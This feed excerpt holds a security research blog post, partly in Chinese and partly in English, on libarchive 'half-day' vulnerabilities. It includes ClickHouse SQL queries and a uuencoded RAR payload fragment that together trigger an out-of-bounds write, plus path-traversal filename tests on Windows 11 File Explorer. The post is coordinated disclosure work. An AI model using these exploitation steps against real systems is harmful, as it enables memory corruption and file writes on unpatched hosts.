&lt;p&gt;於是我們開始尋找有使用 libarchive 的大型專案，我們想嘗試模擬這個「利用 Half-day 攻擊」的場景，同時也認為，在軟體中採用 libarchive 的廠商會更願意幫我們敦促 libarchive 修補漏洞。&lt;/p&gt;

&lt;h3 id=&quot;attacking-clickhouse&quot;&gt;Attacking ClickHouse&lt;/h3&gt;

&lt;p&gt;經過一番調查後，我們發現 ClickHouse 有使用 libarchive 進行解壓縮，非常有可能包含了存在漏洞的程式碼。在 ClickHouse 中我們可以透過 file table engine 對壓縮檔內的資料進行操作：
&lt;img src=&quot;/assets/img/blog/20250212/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不過手冊也提到，ClickHouse 僅支援 zip、tar、7z 三種格式的壓縮檔案：
&lt;img src=&quot;/assets/img/blog/20250212/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但真的是這樣嗎？除了 zip 之外，tar 與 7z 在 ClickHouse 中由 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TarArchiveReader&lt;/code&gt; 與 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SevenZipArchiveReader&lt;/code&gt; 實作，兩者皆繼承於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LibArchiveReader&lt;/code&gt;。&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LibArchiveReader&lt;/code&gt; 開啟檔案的行為實作於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open&lt;/code&gt; 函式，在 &lt;a href=&quot;https://github.com/ClickHouse/ClickHouse/blob/0bd3016a17dab23e64a7e550b2754ce7f7aa1d82/src/IO/Archives/LibArchiveReader.cpp#L150&quot;&gt;source code&lt;/a&gt; 中可看到熟悉的 pattern：&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;archive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path_to_archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;archive_read_new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;archive_read_support_filter_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;archive_read_support_format_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;沒錯，ClickHouse 也是使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_all&lt;/code&gt; 與 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_filter_all&lt;/code&gt;，表示我們一樣可以觸發存在於 RAR 中的弱點！接下來只要讓 ClickHouse 為我們解壓縮檔案即可，雖然現在解壓縮的 feature 可以直接存取 s3 上的檔案，但&lt;strong&gt;當時並不能這樣使用&lt;/strong&gt;：
&lt;img src=&quot;/assets/img/blog/20250212/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以我們必須先上傳檔案，可以透過下列 query 新增一個 table，並且該 table 會以檔案的形式被儲存：&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;poc.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Native&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;payload&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;但這樣產生的 file 會包含 table 的 metadata，在有 metadata 的情況下我們沒有辦法使 libarchive 認為這是一個 RAR 檔案，進而觸發漏洞：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000: 0101 0763 6f6c 756d 6e31 0653 7472 696e  ...column1.Strin
00000010: 6707 7061 796c 6f61 64                   g.payload
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我們需要在 ClickHouse 的 &lt;a href=&quot;https://clickhouse.com/docs/en/interfaces/formats&quot;&gt;Output Data Formats&lt;/a&gt; 中尋找哪些格式不會在檔案的開頭存放置 metadata。最後我們決定使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TabSeparatedRaw&lt;/code&gt;，在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TabSeparatedRaw&lt;/code&gt; 中：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;資料被一列一列儲存&lt;/li&gt;
  &lt;li&gt;一列中的資料被 tab 分隔開&lt;/li&gt;
  &lt;li&gt;資料內不能有 tab 或換行&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;例如，如果使用下列兩個 qeury:&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;test.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;TabSeparatedRaw&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;row1 string&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;test.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;TabSeparatedRaw&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;row2 string&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最後產出的檔案內容會是：&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;row1 string
row2 string
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;因此，若可以處理好第三點「資料內不能有 tab 或換行」，那我們就可以構造出一個合法的 RAR 檔案！那該怎麼樣避免使用 tab 或換行呢？聽起來很難，但不要忘了，ClickHouse 呼叫了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_filter_all&lt;/code&gt; 為我們開啟了所有的 filter！其中，最符合 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TabSeperatedRaw&lt;/code&gt; 描述的就是 UUencode，經過 UUencode 的資料會長這樣：&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;begin 600 exploit.rar.uu
M4F%R(1H&apos;`,^0&amp;lt;P``#0````````!287(A&amp;amp;@&amp;lt;`SY!S```-`````````%VI=(&quot;0
M,0&quot;VXP0`4,\+``(2&apos;^X4O1EY5QTU#``@````;7-V8W(Q,#`N9&amp;amp;QL`/#&amp;lt;ZFP8
M(AE0S(EB&apos;!(&quot;,EM(4I0M-&quot;H*&quot;T6JBHJ!1$1T%IKHFBA0H*:(VV2VP)98R9+*
M&quot;*`T&apos;I;&amp;amp;]1&amp;gt;J]&amp;gt;HZ!&amp;gt;KU4=(ZQTC:4VHB@J4WH2D-%--VSX9S);9IOO.9HF2E
MH47O?/GG[Y^6LSGO/&amp;gt;&amp;gt;Z&amp;gt;&amp;gt;\]YJS!N3_(^_P3SS&quot;O\S`P+6&amp;lt;_V&apos;P(,#`P,#`B
M.EX#-(,!V$Z07A+LVZ?4@K:RB=`NN&amp;lt;+9(IB&amp;lt;?NX``Y[L`3`P,#``,`&apos;/YCL*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;因此最後我們只需要將原本的 rar payload 進行 UUEncode 之後上傳：&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;poc.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;TabSeparatedRaw&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uu_encoded_rar_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;並且觸發解壓縮：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM file(&apos;poc.7z :: **&apos;, RawBLOB)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;就可以成功觸發越界寫漏洞了：
&lt;img src=&quot;/assets/img/blog/20250212/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們最後透過 ClickHouse 在 Bugcrowd 上的賞金計劃進行回報：
&lt;img src=&quot;/assets/img/blog/20250212/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ClickHouse 很快的就進行了&lt;a href=&quot;https://github.com/ClickHouse/ClickHouse/commit/c8a3a0bb11ad1344fbb50b10f50f8eb2a962aa7f&quot;&gt;修復&lt;/a&gt;，並且願意幫我們敦促 libarchive 進行漏洞的修補！雖然不確定微軟是否有告知 libarchive 的維護者們任何關於 CVE-2024-20696 與 CVE-2024-20697 的漏洞資訊（因為沒有任何公開資料，libarchive 在 GitHub repository 上的 &lt;a href=&quot;https://github.com/libarchive/libarchive/security/advisories?state=draft&quot;&gt;Security Advisories&lt;/a&gt; 也沒有任何資料可以參考！）。但如同我們先前提到的，這兩個原先由微軟在 forked 版本的 libarchive 中發現的漏洞，最終 libarchive 也分別在五月跟四月獲得修復，結束了「Half-day」的尷尬狀況。&lt;/p&gt;

&lt;h3 id=&quot;持續追蹤&quot;&gt;持續追蹤&lt;/h3&gt;

&lt;p&gt;除了回報上述兩個「Half-day」之外，別忘了我們還有另外回報三個 0-day 漏洞，它們個別是：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;微軟已經修復的 RCE：CVE-2024-26256
    &lt;ul&gt;
      &lt;li&gt;4/27 回報&lt;/li&gt;
      &lt;li&gt;8/14 修補&lt;/li&gt;
      &lt;li&gt;9/28 關閉&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;filter_audio 中的 oob read
    &lt;ul&gt;
      &lt;li&gt;3/20 回報&lt;/li&gt;
      &lt;li&gt;4/29 修補&lt;/li&gt;
      &lt;li&gt;9/28 關閉&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;filter_delta 中的 oob read
    &lt;ul&gt;
      &lt;li&gt;3/20 回報&lt;/li&gt;
      &lt;li&gt;4/29 修補&lt;/li&gt;
      &lt;li&gt;9/28 關閉&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;在回報後的數個月，他們終於獲得修復，這時已經是九月：
&lt;img src=&quot;/assets/img/blog/20250212/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;half-day-的迴環複沓&quot;&gt;Half-day 的迴環複沓&lt;/h4&gt;

&lt;p&gt;其中較嚴重的是我們已經回報給微軟的漏洞 CVE-2024-26256，微軟在四月時便已經修復：
&lt;img src=&quot;/assets/img/blog/20250212/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在三月回報漏洞的同時，我們有詢問 MSRC 是否會將 CVE-2024-26256 的 patch 提交到 libarchive 的 GitHub repository，第一時間沒有獲得回應。在微軟 patch CVE-2024-26256 之後我們又提問了一次，想確定他們是否有將該漏洞的資訊同步給 libarchive 的 maintainers，MSRC 說：「如果你願意的話，我們鼓勵你開一個獨立的 GitHub issue。」為了避免「Half-day」情況發生，所以我們也在收到訊息後馬上到 libarchive 的 Security Advisory 開了一個 issue：
&lt;img src=&quot;/assets/img/blog/20250212/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然而，「Half-day」還是發生了，因為太久沒有人回應。所以七月時，&lt;a href=&quot;https://github.com/libarchive/libarchive/pull/2269&quot;&gt;我們自己發了一個 PR &lt;/a&gt;將微軟的 patch 移植過來，雖然不確定這個修補方式是不是最好的，但至少比沒有修補還要強。所以，歷史又重演了一次，從四月到修補完成的九月之間，我們又陷入了「Half-day」的情境。&lt;/p&gt;

&lt;h4 id=&quot;餘下的兩個-0-day&quot;&gt;餘下的兩個 0-day&lt;/h4&gt;

&lt;p&gt;眼尖的讀者或許已經注意到，我們所回報的 Security Advisory 並不是在「Published」的分頁中，而是「Closed」：
&lt;img src=&quot;/assets/img/blog/20250212/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;除了剛才提到的 CVE-2024-26256 之外，其餘是兩個尚未申請 CVE 的越界讀取漏洞。針對已經有 CVE 編號的修補，人們會意識到這是一個關於安全性的修補。然而，由於其他兩個漏洞並不為人所知，僅修補卻不通知其他人安全風險的存在是一件危險的事情。尤其，libarchive 是一個廣泛使用的函式庫，有許許多多的軟體或服務使用它，導致人們並不知道自己正在使用 libarchive。這類軟體的相依鏈可能十分龐大且複雜，如果開發者或是終端使用者沒有意識到這是一個安全性的更新，那麼，該修補在整個相依鏈中將會極為緩慢地傳播，進而增加潛在風險。&lt;/p&gt;

&lt;p&gt;所以，在確認 libarchive 將 issue 關閉之後我們就立即申請了 CVE 編號，這兩個漏洞分別是 &lt;a href=&quot;https://github.com/advisories/GHSA-rmj4-vvpv-4m33&quot;&gt;CVE-2024-48957&lt;/a&gt; 與 &lt;a href=&quot;https://github.com/advisories/GHSA-9mw4-2ppr-4mcg&quot;&gt;CVE-2024-48958&lt;/a&gt;，當它們被發佈時，已經是十月，距離修補發布的四月已經過去了六個月。&lt;/p&gt;

&lt;h2 id=&quot;結語&quot;&gt;結語&lt;/h2&gt;

&lt;p&gt;本文介紹了 Windows 在採用 libarchive 以支援更多壓縮檔案格式時，所引發的一些漏洞與有趣的特性。此外，我們也向 libarchive 回報了數個 0-day 漏洞。&lt;/p&gt;

&lt;p&gt;接著，我們在 ClickHouse 上成功利用了我們認為介於 0-day 與 1-day 之間的「Half-day」漏洞。這源於 Windows 將 libarchive fork 出來後，將其編譯為閉源的 archiveint.dll，並在修補該 DLL 後，未能及時通知 libarchive 的維護者，或將修補程式回饋到 libarchive 上游，從而導致了「Half-day」漏洞的產生。&lt;/p&gt;

&lt;p&gt;upstream 較晚獲得修補的原因，除了溝通延遲之外，也因缺乏公開可用的修補程式。維護者在 fork 版本已經完成修補後，才在接獲通報時開始著手解決問題。因此，微軟在修補 fork 版本的 libarchive 後，除了應主動通知原始維護者，更應直接提交 Pull Request (PR) 至上游，以協助完成修補。&lt;/p&gt;

&lt;p&gt;libarchive 的維護者是一群志願者，而且可能沒有領取任何薪水。而開源精神便是人人皆可「分享、參與、行動」，因此我們認為，研究人員在漏洞回報的過程中，除了提供漏洞分析與 PoC 外，也應該積極的提出修補方案，共同維護開源軟體的安全性與品質。&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2025/02/12/from-convenience-to-contagion-the-half-day-threat-and-libarchive-vulnerabilities-lurking-in-windows-11/</link>
                <guid>https://devco.re/blog/2025/02/12/from-convenience-to-contagion-the-half-day-threat-and-libarchive-vulnerabilities-lurking-in-windows-11</guid>
                <pubDate>Wed, 12 Feb 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>From Convenience to Contagion: The Half-Day Threat and Libarchive Vulnerabilities Lurking in Windows 11</title>
                <description>&lt;h2 id=&quot;abstract&quot;&gt;Abstract&lt;/h2&gt;
&lt;p&gt;In the October 2023 update, Windows 11 introduced support for 11 additional compression formats, including RAR and 7z, allowing users to manage these types of files natively within File Explorer. The enhancement significantly improves convenience; however, it also introduces potential security risks. To support these various compression formats, Windows 11 utilizes the libarchive library, a well-established open-source library used across multiple operating systems like Linux, BSD, and macOS, and in major projects such as ClickHouse, Homebrew, and Osquery.&lt;/p&gt;

&lt;p&gt;The libarchive has been continuously fuzzed by Google’s OSS-Fuzz project, making it a time-tested library. However, its coverage in OSS-Fuzz has been less than ideal. In addition to the two remote code execution (RCE) vulnerabilities disclosed by Microsoft Offensive Research &amp;amp; Security Engineering (MORSE) in January, we have identified several vulnerabilities in libarchive through code review and fuzzing. These include a heap buffer overflow vulnerability in the RAR decompression and arbitrary file write and delete vulnerabilities due to insufficient checks of libarchive’s output on Windows. Additionally, in our presentation, we will reveal several interesting features that emerged from the integration of libarchive with Windows.&lt;/p&gt;

&lt;p&gt;And whenever vulnerabilities are discovered in widely-used libraries like libarchive, their risks often permeate every corner, making it difficult to estimate the potential hazards. Moreover, when Microsoft patches Windows, the corresponding fixes are not immediately merged into libarchive. This delay gives attackers the opportunity to exploit other projects using libarchive. For example, the vulnerabilities patched by Microsoft in January were not merged into libarchive until May, leaving countless applications exposed to risk for four months. The worst part is that the developers might not know the vulnerability details or even be aware of its existence. To illustrate this situation, we will use the vulnerabilities we reported to ClickHouse as an example to demonstrate how attackers can exploit the vulnerabilities while libarchive remains unpatched.&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;Before the KB5031455 update, Windows 11 only supported ZIP archives natively. In File Explorer, ZIP files are labeled “Compressed (zipped) Folder.” Users can double-click a ZIP file to view its contents:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Or, even better, add new files to the archive or open existing ones directly:
&lt;img src=&quot;/assets/img/blog/20250212/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When a user double-clicks a file inside a ZIP archive, File Explorer extracts it to a temporary folder with a randomly generated UUID under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%temp%&lt;/code&gt; directory. The file is accessed from this temporary location, and since it’s a temporary file, it will be automatically deleted later:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;compressed-archived-folder&quot;&gt;Compressed Archived Folder&lt;/h3&gt;

&lt;p&gt;Next, after the KB5031455 update in October 2023, Windows 11 added support for 11 new archive file formats:
&lt;img src=&quot;/assets/img/blog/20250212/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This kind of file is labeled “Compressed Archive Folder” by File Explorer:
&lt;img src=&quot;/assets/img/blog/20250212/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Curious about how Windows 11 supports these 11 new archive file formats, we began analyzing File Explorer and the related DLL files. The native support for ZIP in File Explorer is handled by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;After the KB5031455 update, a new class called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArchiveFolder&lt;/code&gt; was added, distinct from the old &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CZipFolder&lt;/code&gt; class used to support ZIP Files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;first-vulnerability-cve-2024-26185&quot;&gt;First Vulnerability: CVE-2024-26185&lt;/h3&gt;

&lt;p&gt;Before firing up IDA, we first conducted black-box testing on the new “Compressed Archive Folder” feature. When it comes to extracting files, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt; is a timeless trick.&lt;/p&gt;

&lt;p&gt;In the first test case, we constructed a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..\poc.txt&lt;/code&gt;, compressed it into an RAR file, and then uploaded it to a Windows machine to open it by double-clicking. There was no Path Traversal; we only saw an empty folder:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We constructed a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123\..\poc.txt&lt;/code&gt; in the second test case. Because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123&lt;/code&gt; was canceled out by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..&lt;/code&gt;, we only saw the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt; solely in File Explore, and still no Path Traversal:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is also no Path Traversal in the corresponding temp folder:
&lt;img src=&quot;/assets/img/blog/20250212/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Excluding “double-clicking,” users will see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt; if they right-click on “Compressed (zipped) Folder” or “Compressed Archive Folder” in File Explorer.
The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt; will try to decompress the whole archive. Let’s test “Compressed Archive Folder” again with that:&lt;/p&gt;

&lt;p&gt;When using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt;,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..\poc.txt&lt;/code&gt; is considered an attempt to escape to the parent directory, causing File Explorer to display an error:
&lt;img src=&quot;/assets/img/blog/20250212/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The extraction of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123\..\poc.txt&lt;/code&gt; is a success, but we still only got the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt;.
&lt;img src=&quot;/assets/img/blog/20250212/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt; decompresses the whole archive, we think we should also test the situation when the file name is an absolute path, for example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\poc\poc.txt&lt;/code&gt;:
&lt;img src=&quot;/assets/img/blog/20250212/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is no error, but the folder &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; was renamed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C_&lt;/code&gt;. Thus, we now know &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; will sanitize the input to avoid Path Traversal or Arbitrary File Write.
&lt;img src=&quot;/assets/img/blog/20250212/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But if one “double-clicks” the RAR file, which contains a file with absolute path name, instead of “Extract All,” it will show a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Local Disk (C:)&lt;/code&gt; folder! The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; isn’t replaced with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C_&lt;/code&gt;!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Besides that, everything seemed normal, even when we navigated to the innermost folder and opened the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt; file:
&lt;img src=&quot;/assets/img/blog/20250212/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Except for the fact that the extra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc&lt;/code&gt; folder is under our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C&lt;/code&gt; volume!
&lt;img src=&quot;/assets/img/blog/20250212/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

